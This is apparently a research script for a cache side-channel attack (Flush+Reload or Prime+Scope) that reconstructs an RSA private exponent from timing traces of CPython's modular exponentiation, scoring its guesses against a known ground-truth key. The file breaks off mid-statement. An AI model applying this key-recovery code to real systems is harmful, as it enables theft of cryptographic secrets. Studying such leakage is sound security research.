import argparse
import contextlib
import glob
import os
from collections import Counter
from concurrent.futures import ProcessPoolExecutor, as_completed
import pandas as pd
import numpy as np

from utils import load_trace, lat_to_hit, progress

CONSUME_ZERO = 0
WINDOW = 1
TRAILING = 2
GAP = -1

attack_type = "FR"
acc_threshold = 0.75
key_path = None
COMSUME_ZEROS_DUP_INTERVAL = 40000

MAX_RISKY_GUESSES = 1
NORMAL_RATIO = 0.13
RECOVERY_RATIO = 0.3

# Per-step trace dump — only useful when debugging a single file.
DEBUG_PRINT = False


def dbg(*args, **kwargs):
    if DEBUG_PRINT:
        print(*args, **kwargs)


def write_key_from_pem(pem_path, dst):
    """Generate a ground-truth private.key from an RSA .pem.

    Loads the PKCS#1 private key, takes its exponent `d`, and writes it as a
    'bin(d)' string (e.g. '0b101...\\n') to `dst` — the exact format the rest of
    this module expects in private.key. Returns `dst`.
    """
    import rsa

    with open(pem_path, "rb") as f:
        key = rsa.PrivateKey.load_pkcs1(f.read())
    with open(dst, "w") as f:
        f.write(bin(key.d) + "\n")
    return dst


def resolve_key_path(folder, max_levels=4):
    if key_path:
        print(f"# key={key_path}")
        return key_path

    d = os.path.abspath(folder)
    for _ in range(max_levels + 1):
        candidate = os.path.join(d, "private.key")
        if os.path.exists(candidate):
            print(f"# key={candidate}")
            return candidate
        parent = os.path.dirname(d)
        if parent == d:
            break
        d = parent

    fallback = os.path.join(folder, "private.key")
    print(f"# key={fallback} (not found)")
    return fallback


def build_transition_table():
    table = {}
    table[(("", 0), "CZ")] = (40000, ("CZ", 1))
    table[(("", 0), "AW")] = (40000, ("AW", 1))
    table[(("", 0), "AT")] = (150000, ("", 0))

    table[(("", 1), "CZ")] = (150000, ("CZ", 1))
    table[(("", 1), "AW")] = (150000, ("AW", 1))

    table[(("CZ", 1), "CZ")] = (150000, ("CZ", 1))
    table[(("CZ", 1), "AW")] = (150000, ("AW", 1))

    for i in range(1, 5):
        table[(("AW", i), "AT")] = (300000, ("AT", i + 1))
        table[(("AW", i), "AW")] = (150000, ("AW", i + 1))

    for i in range(2, 5):
        table[(("AT", i), "AT")] = (150000, ("AT", i + 1))

    table[(("AW", 5), "AW")] = (300000, ("AW", 1))
    table[(("AW", 5), "CZ")] = (300000, ("CZ", 1))
    table[(("AT", 5), "AW")] = (150000, ("AW", 1))
    table[(("AT", 5), "CZ")] = (150000, ("CZ", 1))

    return table


TRANSITION_TABLE = build_transition_table()


def run_state_machine(hits):
    counters = []
    prev = None
    ctr = 0
    skipped = 0

    i = 0
    while i < len(hits):
        hit = hits[i]
        i += 1

        if prev is None and (hit[TRAILING] or (hit[CONSUME_ZERO] and hit[WINDOW])):
            continue

        if not any(hit):
            skipped += 1
            continue

        if hit[CONSUME_ZERO] and not hit[WINDOW]:
            if prev is WINDOW:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0
                prev = TRAILING

            if prev is TRAILING:
                counters.append((TRAILING, ctr))
                ctr = 0
                skipped = 0

            prev = CONSUME_ZERO
            ctr += 1

        elif hit[WINDOW]:
            if prev is WINDOW and ctr + skipped >= 10:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0
                prev = TRAILING

            if prev is TRAILING:
                counters.append((TRAILING, ctr))
                ctr = 0
                skipped = 0
                prev = CONSUME_ZERO

            if prev in [None, CONSUME_ZERO]:
                counters.append((CONSUME_ZERO, ctr))
                ctr = 0
                skipped = 0

            prev = WINDOW
            ctr += 1

        elif hit[TRAILING]:
            if prev is CONSUME_ZERO:
                counters.append((CONSUME_ZERO, ctr))
                ctr = 0
                skipped = 0
                prev = WINDOW

            if prev is WINDOW:
                counters.append((WINDOW, ctr))
                ctr = 0
                skipped = 0

            prev = TRAILING
            ctr += 1

    return counters


def strip_preamble(hits):
    i = 0
    while i < len(hits) and not (
        hits[i][CONSUME_ZERO] and hits[i][WINDOW] and hits[i][TRAILING]
    ):
        i += 1
    hits = hits[i + 2 :]

    i = len(hits) - 1
    while i > 2 and not (any(hits[i])):
        i -= 1
    return hits[:i]


def parse_trace(file):
    hits = []
    with open(file) as f:
        lines = f.read().strip().splitlines()

    for line in lines:
        hit = []
        entries = line.strip().split()

        for entry in entries:
            lat = int(entry.split(":")[1])
            hit.append(lat_to_hit(lat, attack_type))

        hits.append(hit)

    return run_state_machine(strip_preamble(hits))


def parse_trace_PS(filepath):
    df = load_trace(filepath)

    mapping = {0: "CZ", 1: "AW", 2: "AT"}
    # 0: Comsume_Zeros
    # 1: Absorb_Window
    # 2: Absorb_Trailing

    hits = []
    for col in df.columns:
        tmp = pd.DataFrame(df[col].tolist(), columns=["tsc", "lat"])
        tmp["src"] = mapping[col]
        hits.append(tmp)

    visited_hits = pd.concat(hits, ignore_index=True)
    visited_hits = visited_hits[
        ~((visited_hits["tsc"] == 0) & (visited_hits["lat"] == 0))
    ]
    visited_hits = (
        visited_hits.drop(columns=["lat"]).sort_values("tsc").reset_index(drop=True)
    )

    return visited_hits


def merge_traces(size, files):
    merged = [Counter() for i in range(size)]

    for file in files:
        trace = parse_trace(file)
        for i, ctr in enumerate(trace):
            merged[i][ctr[1]] += 1

    return merged


def infer_FR(merged, nr):
    inf = []

    p = 0
    while True:
        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer zeroes
        zeroes = max(merged[p], key=merged[p].get)
        # zconfidence = merged[p][zeroes] / nr
        # print("Infer", zeroes, "zeroes, confidence:", zconfidence)
        for i in range(zeroes):
            inf.append(0)
        p += 1

        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer reduced window
        reduced = max(merged[p], key=merged[p].get)
        wconfidence = merged[p][reduced] / nr
        reduced = max(reduced, 1)
        # assert 1 <= reduced <= 5
        p += 1

        if p >= len(merged) or len(merged[p]) == 0:
            break
        # infer trailing
        trailing = max(merged[p], key=merged[p].get)
        tconfidence = merged[p][trailing] / nr
        # assert trailing < 5
        p += 1

        if reduced + trailing != 5:
            # print("Adapting window based on confidence")
            if wconfidence > tconfidence:
                trailing = 5 - min(reduced, 5)
            else:
                reduced = 5 - min(trailing, 5)

        # print("Infer", reduced, "- reduced window, confidence:", wconfidence)
        inf.append(1)
        for i in range(reduced - 2):
            inf.append(-1)
        if reduced > 1:
            inf.append(1)

        # print("Infer", trailing, "- trailing zeroes, confidence:", tconfidence)
        for i in range(trailing):
            inf.append(0)

    return inf


gt = []


def check_inf_match(inf):
    global gt
    ret = True
    mb = 0
    for idx, bits in enumerate(inf):
        if bits == "1" and not gt[idx] == "1":
            if not mb:
                mb = idx
            ret = False
        if bits == "0" and not gt[idx] == "0":
            if not mb:
                mb = idx
            ret = False
    if not ret:
        print("".join(inf), "".join(gt[: len(inf)]), mb, sep="\n")
    return ret


def parse_PS_window(seg, window_start, window_size):
    tsc = seg["tsc"].values
    src = seg["src"].values

    print("Window:")
    window_end = window_start
    while window_end < len(tsc) and tsc[window_end] - tsc[window_start] < window_size:
        print(tsc[window_end], src[window_end])
        window_end += 1
    return window_end


def get_next_state(current_state, trigger, ratio=0.2):
    dbg("get_next_state:", current_state, trigger)
    trigger_name, trigger_value = trigger
    entry = TRANSITION_TABLE.get((current_state, trigger_name))
    if entry is None:
        return None, None

    center, next_state = entry
    if center * (1 - ratio) <= trigger_value <= center * (1 + ratio):
        return next_state, abs(trigger_value - center)

    return None, None


def get_state_successors(state):
    for (s, trig), (center, n_state) in TRANSITION_TABLE.items():
        if s == state:
            yield trig, center, n_state


def resolve_bits(current_state, next_state, diff):
    dbg(current_state, next_state, diff)
    bits_table = {
        (("", 0), ("CZ", 1)): "",
        (("", 0), ("AW", 1)): "",
        (("", 1), ("CZ", 1)): "",
        (("", 1), ("AW", 1)): "",
        (("CZ", 1), ("CZ", 1)): "0",
        (("CZ", 1), ("AW", 1)): "0",
        (("AW", 1), ("AW", 2)): "",
        (("AW", 2), ("AW", 3)): "",
        (("AW", 3), ("AW", 4)): "",
        (("AW", 4), ("AW", 5)): "",
        (("AW", 1), ("AT", 2)): "1",
        (("AW", 2), ("AT", 3)): "11",
        (("AW", 3), ("AT", 4)): "1?1",
        (("AW", 4), ("AT", 5)): "1??1",
        (("AW", 5), ("CZ", 1)): "1???1",
        (("AW", 5), ("AW", 1)): "1???1",
        (("AT", 2), ("AT", 3)): "0",
        (("AT", 3), ("AT", 4)): "0",
        (("AT", 4), ("AT", 5)): "0",
        (("AT", 5), ("AW", 1)): "0",
        (("AT", 5), ("CZ", 1)): "0",
    }

    return bits_table.get((current_state, next_state))


def dfs_trace(
    tsc,
    src,
    state,
    pos,
    last_tsc,
    count,
    inf,
    window_size,
    visited=None,
    target_length=None,
    risky_guesses=0,
):
    # Returns (inf, had_confident). The visited key includes risky_guesses
    # because results that touched recovery depend on whether the caller had
    # already used a guess.
    if visited is None:
        visited = {}

    if target_length is not None and len(inf) >= target_length:
        return inf, False

    if pos >= len(tsc):
        return inf, False

    visited_key = (state, pos, last_tsc, risky_guesses)
    if visited_key in visited:
        return inf + visited[visited_key][0], visited[visited_key][1]

    initial_len = len(inf)
    had_confident = False

    while pos < len(tsc):
        dbg("New Group starting from:")
        dbg(tsc[pos], src[pos], "Index", count[src[pos]])

        n_pos = pos
        while n_pos < len(tsc) and tsc[n_pos] - tsc[pos] < window_size:
            n_pos += 1

        def collect(ratio):
            out = []
            for idx in range(pos, n_pos):
                n_state, diff = get_next_state(
                    state, (src[idx], tsc[idx] - last_tsc), ratio=ratio
                )
                if n_state:
                    out.append((n_state, idx, diff))
            return out

        ns_list = collect(NORMAL_RATIO)

        if ns_list:
            # Branch over every viable candidate observation — including two
            # that share the same next_state but straddle the expected delta
            # (e.g. one Δ just under, one just over center). Picking only the
            # smallest-diff one drops information when the diffs are similar.
            candidates = sorted(ns_list, key=lambda x: x[2])

            if len(candidates) == 1:
                n_state, nw_idx, diff = candidates[0]
                bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
                if bits is None:
                    dbg("???")
                    visited[visited_key] = (inf[initial_len:], had_confident)
                    return inf, had_confident

                for i in range(pos, nw_idx + 1):
                    count[src[i]] += 1
                inf += bits
                state = n_state
                last_tsc = tsc[nw_idx]
                pos = nw_idx + 1
                had_confident = True
                risky_guesses = 0
                dbg("Infer Length " + str(len(inf)), inf, "\n", sep="\n")

                if target_length is not None and len(inf) >= target_length:
                    dbg(
                        f"[DONE] reached target_length={target_length}; aborting search."
                    )
                    return inf, had_confident
                continue

            # Multi-candidate confident DFS: pick the branch that runs longer.
            dbg(
                f"[BRANCH] {len(candidates)} candidate next states from {state}: "
                f"{[c[0] for c in candidates]}"
            )
            best_branch = inf
            best_branch_had_conf = had_confident
            early_term = False
            for n_state, nw_idx, diff in candidates:
                bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
                if bits is None:
                    continue
                sub_count = dict(count)
                for i in range(pos, nw_idx + 1):
                    sub_count[src[i]] += 1
                sub_inf = inf + bits
                dbg(f"  [confident] {state} -> {n_state} (bits={bits!r}, diff={diff})")
                branch, branch_had_conf = dfs_trace(
                    tsc,
                    src,
                    n_state,
                    nw_idx + 1,
                    tsc[nw_idx],
                    sub_count,
                    sub_inf,
                    window_size,
                    visited,
                    target_length,
                    0,
                )
                if target_length is not None and len(branch) >= target_length:
                    best_branch = branch
                    best_branch_had_conf = had_confident or branch_had_conf
                    early_term = True
                    break
                if len(branch) > len(best_branch):
                    best_branch = branch
                    best_branch_had_conf = had_confident or branch_had_conf
            if not early_term:
                visited[visited_key] = (best_branch[initial_len:], best_branch_had_conf)
            return best_branch, best_branch_had_conf

        # No matching transition at the normal ratio.
        if risky_guesses >= MAX_RISKY_GUESSES:
            dbg(
                f"Stuck at pos {pos} state {state}; chained {risky_guesses} "
                "guesses with no confident match — refusing further speculation."
            )
            visited[visited_key] = (inf[initial_len:], had_confident)
            return inf, had_confident

        # Build recovery branches: loose-ratio matches AND virtual successors.
        # Each branch must be validated by a downstream confident match.
        recovery_branches = []

        for n_state, nw_idx, diff in sorted(
            collect(RECOVERY_RATIO), key=lambda x: x[2]
        ):
            bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
            if bits is None:
                continue
            recovery_branches.append(
                ("loose", n_state, nw_idx + 1, tsc[nw_idx], bits, nw_idx)
            )

        # Delayed match: a real observation arrived later than expected due to
        # a random scheduling delay (per user's diagnosis of r3/r7). Same
        # transition as a confident match, just stretched. We advance last_tsc
        # by `center` (canonical position) so subsequent timing measures from
        # where the obs SHOULD have been — this assumes the trace catches back
        # up after the one-off delay. (Advancing to the actual obs tsc instead
        # explodes the visited key space and OOMs the DFS.)
        for idx in range(pos, n_pos):
            actual_delta = tsc[idx] - last_tsc
            trig = src[idx]
            entry = TRANSITION_TABLE.get((state, trig))
            if entry is None:
                continue
            center, n_state = entry
            if actual_delta <= center * (1 + RECOVERY_RATIO):
                continue
            bits = resolve_bits(state, n_state, center)
            if bits is None:
                continue
            recovery_branches.append(
                (
                    "delayed",
                    n_state,
                    idx + 1,
                    last_tsc + center,
                    bits,
                    f"delayΔ={actual_delta - center}@{idx}",
                )
            )

        # Fallback only: speculate (invent a transition with no observation
        # behind it) only when no real observation supports any recovery here.
        # A trace that can recover from an actual hit is never touched by
        # speculation — the confident and loose/delayed branches above already
        # returned/handled it. Speculative branches are still only *kept* if a
        # downstream confident match corroborates them (see branch_had_conf),
        # so an uncorroborated guess never survives.
        if not recovery_branches:
            for trig_name, center, n_state in get_state_successors(state):
                bits = resolve_bits(state, n_state, center)
                if bits is None:
                    continue
                recovery_branches.append(
                    ("spec", n_state, pos, last_tsc + center, bits, trig_name)
                )

        dbg(
            f"[RECOVER] no transition from {state} at pos {pos}; "
            f"trying {len(recovery_branches)} recovery branches"
        )
        threshold = len(inf)
        best_branch = inf
        best_branch_had_conf = had_confident
        early_term = False
        for kind, n_state, next_pos, new_last_tsc, bits, tag in recovery_branches:
            new_count = dict(count)
            if kind == "loose" or kind == "delayed":
                for i in range(pos, next_pos):
                    new_count[src[i]] += 1
            branch_inf = inf + bits
            dbg(
                f"  [{kind}] {state} -> {n_state} tag={tag} "
                f"(bits={bits!r}, last_tsc={new_last_tsc}, next_pos={next_pos})"
            )
            branch, branch_had_conf = dfs_trace(
                tsc,
                src,
                n_state,
                next_pos,
                new_last_tsc,
                new_count,
                branch_inf,
                window_size,
                visited,
                target_length,
                risky_guesses + 1,
            )
            if target_length is not None and len(branch) >= target_length:
                best_branch = branch
                best_branch_had_conf = had_confident or branch_had_conf
                early_term = True
                break
            # Only keep a guess that produced an actual confident match in its
            # subtree. Pure speculation chains (no real observation matched)
            # get discarded — their bits aren't trustworthy.
            if branch_had_conf and len(branch) > len(best_branch):
                best_branch = branch
                best_branch_had_conf = True
        if len(best_branch) == threshold:
            dbg(
                "[RECOVER] no branch validated; "
                "discarding all recovery guesses at this point."
            )
        if not early_term:
            visited[visited_key] = (best_branch[initial_len:], best_branch_had_conf)
        return best_branch, best_branch_had_conf

    visited[visited_key] = (inf[initial_len:], had_confident)
    return inf, had_confident


def infer_PS(seg, pre_counts=None, target_length=None):
    inf = ""

    tsc = seg["tsc"].values
    src = seg["src"].values

    if len(tsc) == 0:
        return inf

    start_window = 15000
    start_idx = 0
    count = pre_counts
    fw_count = {"CZ": 0, "AW": 0, "AT": 0}

    found = False
    for r in range(len(tsc)):
        fw_count[src[r]] += 1

        while tsc[r] - tsc[start_idx] > start_window:
            fw_count[src[start_idx]] -= 1
            count[src[start_idx]] += 1
            start_idx += 1

        if all(v > 0 for v in fw_count.values()):
            found = True
            break

    if not found:
        for i in range(start_idx):
            count[src[i]] -= 1
        start_idx = 0

    dbg("First Window")
    start_end = start_idx
    while start_end < len(tsc) and tsc[start_end] - tsc[start_idx] < start_window:
        dbg(tsc[start_end], src[start_end], "Index", count[src[start_end]])
        count[src[start_end]] += 1
        start_end += 1

    # FIXME: hardcoded window size
    window_size = 600000
    second_window_range = (25000, 50000)
    pos = start_end

    nt = {"CZ": False, "AW": False, "AT": False}
    # Resolve the trailing zeros in the first window
    c_tsc, c_src = seg.iloc[pos - 1]
    l_tsc = c_tsc

    n_pos = pos
    dbg("Second Window Start")
    while n_pos < len(seg) and tsc[n_pos] - l_tsc < second_window_range[1]:
        dbg(tsc[n_pos], src[n_pos], "Index", count[src[n_pos]])
        n_tsc, n_src = seg.iloc[n_pos]
        count[n_src] += 1
        if second_window_range[0] < n_tsc - l_tsc:
            nt[n_src] = True
        n_pos += 1

    dbg(nt)
    state = ("", 0)
    if nt["AW"]:
        inf = "1???1"
    elif nt["AT"]:
        at_cnt = 1
        dbg(pos, n_pos)
        for i in range(pos, n_pos):
            if (
                src[i] == "AT"
                and second_window_range[0] < tsc[i] - l_tsc
                and tsc[i] - l_tsc < second_window_range[1]
            ):
                last_tsc = tsc[i]
                break
        pos = n_pos
        while pos < len(tsc):
            dbg(tsc[pos], src[pos], "Index", count[src[pos]])

            while n_pos < len(tsc) and tsc[n_pos] - tsc[pos] < window_size:
                n_pos += 1

            def collect(ratio):
                out = []
                for idx in range(pos, n_pos):
                    n_state, diff = get_next_state(
                        state, (src[idx], tsc[idx] - last_tsc), ratio=ratio
                    )
                    if n_state:
                        out.append((n_state, idx, diff))
                return out

            ns_list = collect(NORMAL_RATIO)

            if len(ns_list) == 1 and ("", 0) in ns_list[0]:
                n_state, nw_idx, diff = ns_list[0]
                for i in range(pos, nw_idx + 1):
                    count[src[i]] += 1
                at_cnt += 1
                last_tsc = tsc[nw_idx]
                pos = nw_idx + 1
            else:
                break
        if at_cnt == 4:
            inf = "10000"
        elif at_cnt == 3:
            inf = "11000"
        elif at_cnt == 2:
            inf = "1?100"
        elif at_cnt == 1:
            inf = "1??10"
        else:
            print("Failed to parse the fisrt window")
            return
        state = ("", 1)
    elif nt["CZ"]:
        inf = "1???1"
    else:
        print("Failed to parse the fisrt window")
        return

    print("First window inference: ", inf, "\n\n")
    # Remaining Windows (recursive DFS, with bounded speculation on missed hits)

    last_tsc = tsc[pos - 1] if pos > 0 else 0

    # Single search. Speculation is always permitted but only fires where no
    # confident or real (loose/delayed) candidate exists, and only survives if a
    # downstream confident match corroborates it — so it never reroutes what the
    # observations already pin down, it only bridges genuine gaps.
    visited = {}
    inf, _ = dfs_trace(
        tsc,
        src,
        state,
        pos,
        last_tsc,
        count,
        inf,
        window_size,
        visited=visited,
        target_length=target_length,
    )

    return inf


def find_str_offset(d, inf):
    l = len(d)
    offset = 5
    while offset < l:
        if d[offset] == 1:
            break
        offset += 1

    i = 0
    while i < offset:
        if inf[i] == 1:
            break
        i += 1

    return offset - i


INF_CHAR_TO_INT = {"0": 0, "1": 1, "?": -1}


def collect_metrics(d, inf, size=1):
    """Single source of truth for inference scoring.

    Args:
        d:   ground-truth key bits as a list of int (0/1).
        inf: inference, either a string of '0'/'1'/'?' or a list of int
             (0/1/-1, where -1 is '?'). Both forms are normalized internally.
        size: number of source traces folded into `inf` (1 for a single trace,
              N for a merged vote across N).

    Conventions:
        - A position is "recoverable" if the trace structure pins its value
          down: leading 0s, window-edge 1s, and trailing 0s inside a window.
        - Inner-window `?` positions are NOT recoverable.
        - Recovered  = recoverable positions where the inference committed a bit.
        - Accuracy   = of all non-? inferences, how many match gt at a
                       recoverable position. Committing a bit at an inner-`?`
                       position is inaccurate even if the value happens to
                       match gt — the trace had no business pinning it down.
    """
    # Normalize inf to int form.
    if isinstance(inf, str):
        inf_int = [INF_CHAR_TO_INT.get(c, -1) for c in inf]
    else:
        inf_int = list(inf)

    # Build `recoverable_bits` parallel to d: 0 or 1 where the structure pins
    # the value down, -1 inside windows where the trace can't.
    recoverable_bits = []
    i = 0
    l = len(d)
    while i < l:
        if d[i] == 0:
            recoverable_bits.append(0)
            i += 1
            continue

        end = min(l - 1, i + 4)
        at = 0
        while end > i:
            if d[end] == 1:
                break
            end -= 1
            at += 1

        aw = end - i + 1
        if aw < 3:
            recoverable_bits += [1] * aw
        else:
            recoverable_bits += [1] + [-1] * (aw - 2) + [1]
        recoverable_bits += [0] * at
        i += aw + at

    recoverable = sum(1 for b in recoverable_bits if b != -1)

    recovered = 0
    inferred = 0
    correct = 0
    q = 0
    first_failure = -1

    for idx in range(min(l, len(inf_int))):
        bit = recoverable_bits[idx]
        inf_bit = inf_int[idx]

        if inf_bit == -1:
            q += 1
            continue
        if bit != -1:
            recovered += 1

        inferred += 1
        if bit != -1 and inf_bit == bit:
            correct += 1
        elif first_failure == -1:
            first_failure = idx

    inf_len = len(inf)
    return {
        "Sample Size": size,
        "Bits": inf_len,
        "Recoverable": recoverable,
        "Recovered": recovered,
        "Recovered%": (recovered / recoverable * 100.0) if recoverable else 0.0,
        "Inferred": inferred,
        "Correct": correct,
        "Wrong": inferred - correct,
        "?": q,
        "?%": (q / inf_len * 100.0) if inf_len else 0.0,
        "Accuracy%": (correct / inferred * 100.0) if inferred else 0.0,
        "First Failure": first_failure,
    }


def merge_inferences(inf_list, target_len, min_vote_ratio=0.5, min_reached=2):
    # A position commits to 0 or 1 only when:
    #   - at least `min_reached` traces actually reached it (corroboration), AND
    #   - one side strictly outvotes the other (plurality), AND
    #   - the winning side's vote count is at least min_vote_ratio of the
    #     traces that actually reached this position (i.e. didn't already
    #     give up before pos i).
    # Otherwise the position stays '?'. The min_reached guard matters at the
    # trace tail: when only a single trace runs that far, its bits are
    # uncorroborated, so a lone (often speculative) wrong bit would otherwise be
    # committed as definite. Leaving it '?' is the safe call — a known-unknown
    # beats a silently wrong bit. With a single trace overall there is nothing
    # to corroborate against, so fall back to a threshold of 1.
    min_reached = min(min_reached, len(inf_list)) if inf_list else 1
    result = []
    for i in range(target_len):
        reached = sum(1 for inf in inf_list if i < len(inf))
        if reached < min_reached:
            result.append(-1)
            continue
        v0 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == "0")
        v1 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == "1")
        winner_votes = max(v0, v1)
        if winner_votes / reached < min_vote_ratio:
            result.append(-1)
        elif v1 > v0:
            result.append(1)
        elif v0 > v1:
            result.append(0)
        else:
            result.append(-1)
    return result


def extract_FR(folder):
    with open(resolve_key_path(folder)) as f:
        keys = f.read().strip()
        d = list(map(int, keys[2:]))

    files = glob.glob(f"{folder}/*.out")

    merged = [Counter() for i in range(len(d))]
    metrics = []

    task = progress.add_task("[green]Processing traces...", total=len(files))
    prev = 0
    next = 1
    while next <= len(files):
        for i in range(prev, next):
            trace = parse_trace(files[i])
            for j, ctr in enumerate(trace):
                merged[j][ctr[1]] += 1
            progress.update(task, advance=1)

        inf = infer_FR(merged, next)

        # offset = find_str_offset(d, inf)
        # print("Exponent:", "".join([str(x) for x in d]))
        # s = "Inferred: " + " " * offset
        # for i in inf:
        #     if i == -1:
        #         s += "_"
        #     else:
        #         s += str(i)
        # print(s)

        m = collect_metrics(d, inf, next)
        # print(m)
        metrics.append(m)

        prev = next
        next = 2 * next

    progress.remove_task(task)
    return metrics


def parse_trace_segment(visited_hits, k=5):
    tsc = visited_hits["tsc"].values
    if len(tsc) < 2:
        empty = visited_hits.iloc[0:0].reset_index(drop=True)
        return empty, {"CZ": 0, "AW": 0, "AT": 0}
    diff = np.diff(tsc)

    d50 = np.percentile(diff, 50)
    d99 = np.percentile(diff, 99)
    thres = d50 * k
    print(d50, d99, thres)
    split_idx = np.where(diff > thres)[0]

    segments = np.split(tsc, split_idx + 1)
    print(list(map(len, segments)))
    target_range = max(segments, key=len)
    low, high = target_range[0], target_range[-1]
    print(low, high)
    core_seg = visited_hits[
        (visited_hits["tsc"] >= low) & (visited_hits["tsc"] <= high)
    ].reset_index(drop=True)
    pre = visited_hits[visited_hits["tsc"] < low]["src"].value_counts().to_dict()
    pre_counts = {k: pre.get(k, 0) for k in ("CZ", "AW", "AT")}
    return core_seg, pre_counts


def process_PS_file(filepath, target_length=None):
    hits = parse_trace_PS(filepath)
    core_segment, pre_counts = parse_trace_segment(hits)
    return infer_PS(core_segment, pre_counts, target_length=target_length)


def process_PS_file_silent(filepath, target_length=None):
    """Worker target for ProcessPoolExecutor: runs process_PS_file with
    stdout/stderr redirected to /dev/null so debug prints don't drown the
    parent's metrics output. Returns (filepath, inf_or_empty, error_or_None)."""
    try:
        with open(os.devnull, "w") as devnull:
            with (
                contextlib.redirect_stdout(devnull),
                contextlib.redirect_stderr(devnull),
            ):
                inf = process_PS_file(filepath, target_length=target_length) or ""
        return filepath, inf, None
    except Exception as exc:
        return filepath, "", f"{type(exc).__name__}: {exc}"


def format_metrics_header():
    return (
        f"# {'file':<10} {'inf_len':>8} {'?':>6} {'?%':>6} {'inferred':>9} "
        f"{'correct':>8} {'acc%':>7} {'wrong':>6} {'first_wrong':>11} {'status':>10}"
    )


def format_metrics_row(label, m, status):
    return (
        f"  {label:<10} {m['Bits']:>8} {m['?']:>6} {m['?%']:>5.1f}% "
        f"{m['Inferred']:>9} {m['Correct']:>8} {m['Accuracy%']:>6.2f}% "
        f"{m['Wrong']:>6} {m['First Failure']:>11} {status:>10}"
    )


def print_metrics_header():
    print(format_metrics_header(), flush=True)


def print_metrics_row(label, m, status):
    print(format_metrics_row(label, m, status), flush=True)


def ps_trace_files(folder):
    """Sorted r*.out trace files in `folder`, ordered by trace index."""

    def trace_index(p):
        name = os.path.basename(p)
        stem = name[1:].split(".")[0] if name.startswith("r") else name
        try:
            return (0, int(stem))
        except ValueError:
            return (1, name)

    return sorted(glob.glob(f"{folder}/r*.out"), key=trace_index)


def load_key_bits(folder):
    """Return (d, gt_list) for `folder`: d as int list, gt_list as char list."""
    with open(resolve_key_path(folder)) as f:
        keys = f.read().strip()
    return list(map(int, keys[2:])), list(keys[2:])


def summarize_ps(folder, files, results, d, gt_str):
    """Build a PS report from already-parsed trace results.

    `results` maps each path in `files` to (inf, err). Returns (metrics, lines)
    where `lines` are the formatted report lines (header, per-trace rows,
    totals, merged) ready to print. Pure formatting — no I/O — so a caller can
    print a whole key's report atomically once all its runs are parsed.
    """
    lines = [f"# folder={folder} gt_len={len(gt_str)}", format_metrics_header()]

    totals = {"inferred": 0, "correct": 0, "q": 0, "wrong": 0, "len": 0}
    ok_runs = 0
    metrics = []
    all_infs = []

    for fp in files:
        inf, err = results[fp]
        name = os.path.basename(fp)
        if err:
            status = f"ERR:{err.split(':', 1)[0]}"
        else:
            status = "ok" if inf else "no-inf"

        m = collect_metrics(d, inf, 1)
        lines.append(format_metrics_row(name, m, status))
        totals["inferred"] += m["Inferred"]
        totals["correct"] += m["Correct"]
        totals["q"] += m["?"]
        totals["wrong"] += m["Wrong"]
        totals["len"] += m["Bits"]
        if status == "ok" and m["Accuracy%"] >= 99.0 and m["?%"] <= 40.0:
            ok_runs += 1
        if inf:
            all_infs.append(inf)

    agg_acc = 100 * totals["correct"] / max(1, totals["inferred"])
    lines.append(
        f"# totals: inferred={totals['inferred']} correct={totals['correct']} "
        f"({agg_acc:.2f}%) q={totals['q']} wrong={totals['wrong']}  "
        f"good_runs={ok_runs}/{len(files)}"
    )

    # Merge all per-file inferences into a single voted key.
    if all_infs:
        merged_int = merge_inferences(all_infs, len(d))
        m_final = collect_metrics(d, merged_int, len(all_infs))
        lines.append(format_metrics_row("MERGED", m_final, "merged"))
        metrics.append(m_final)

    return metrics, lines


def extract_PS(folder):
    d, gt_local = load_key_bits(folder)
    global gt
    gt = gt_local
    gt_str = "".join(gt)

    files = ps_trace_files(folder)

    task = progress.add_task("[green]Processing traces (PS)...", total=len(files))

    # Run each trace in its own subprocess; child stdout/stderr is silenced so
    # only the per-trace metrics row reaches this stdout. Collect every result
    # before printing so the rows come out in trace-index order once all runs
    # are parsed (deterministic), rather than interleaved by completion time.
    results = {}
    with ProcessPoolExecutor() as executor:
        futures = {
            executor.submit(process_PS_file_silent, fp, len(gt_str)): fp for fp in files
        }
        for fut in as_completed(futures):
            fp, inf, err = fut.result()
            results[fp] = (inf, err)
            progress.update(task, advance=1)

    progress.remove_task(task)

    metrics, lines = summarize_ps(folder, files, results, d, gt_str)
    for line in lines:
        print(line, flush=True)
    return metrics


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret exponent from cpython pow trace"
    )

    parser.add_argument(
        "-d",
        "-f",
        dest="path",
        type=str,
        required=True,
        help="Folder containing private.key and *.out traces, or a single *.out file",
    )

    parser.add_argument(
        "--pem",
        type=str,
        default=None,
        help="RSA .pem to derive ground truth from; writes <folder>/private.key",
    )

    parser.add_argument(
        "--at",
        choices=["FR", "PS"],
        default="FR",
        help="Attack primitive: FR (Flush+Reload) or PS (Prime+Scope) (default: FR)",
    )

    parser.add_argument(
        "--threshold",
        type=float,
        default=0.75,
        help="Accuracy threshold for offset alignment (default: 0.75)",
    )

    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable per-step DFS debug prints (very verbose).",
    )

    args = parser.parse_args()

    attack_type = args.at
    acc_threshold = args.threshold
    DEBUG_PRINT = args.debug

    # If a .pem is given, derive ground truth from it and drop a private.key
    # next to the traces so the usual resolution finds it.
    if args.pem:
        folder = (
            os.path.dirname(os.path.abspath(args.path))
            if os.path.isfile(args.path)
            else args.path
        )
        write_key_from_pem(args.pem, os.path.join(folder, "private.key"))

    if os.path.isfile(args.path):
        folder = os.path.dirname(os.path.abspath(args.path))
        kfile = resolve_key_path(folder)
        target_length = None
        if os.path.exists(kfile):
            with open(kfile) as f:
                keys = f.read().strip()
            gt = list(keys[2:])
            target_length = len(gt)
        if attack_type == "PS":
            with progress:
                inf = process_PS_file(args.path, target_length=target_length)
            print(inf)
            if inf and os.path.exists(kfile):
                d = list(map(int, gt))
                m = collect_metrics(d, inf, 1)
                print_metrics_header()
                print_metrics_row(os.path.basename(args.path), m, "ok")
    else:
        if attack_type == "FR":
            with progress:
                metrics = extract_FR(args.path)
            for m in metrics:
                print(m)
        elif attack_type == "PS":
            with progress:
